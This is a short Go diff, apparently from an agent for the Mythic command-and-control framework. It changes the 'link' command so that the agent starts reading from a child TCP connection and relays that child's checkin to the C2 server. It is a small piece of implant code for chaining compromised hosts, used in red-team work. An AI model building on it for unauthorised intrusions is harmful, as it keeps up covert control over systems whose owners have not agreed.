@@ -104,8 +104,9 @@ func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 	childUUID := string(decoded[:36])
 
-	// Register the child connection with the TCP profile
+	// Register the child connection and start reading from it
 	tcpProfileInstance.AddChildConnection(childUUID, conn)
+	tcpProfileInstance.StartReadFromChild(childUUID, conn)
 
 	// Forward the child's checkin as a delegate message to Mythic
 	tcpProfileInstance.InboundDelegates <- structs.DelegateMessage{
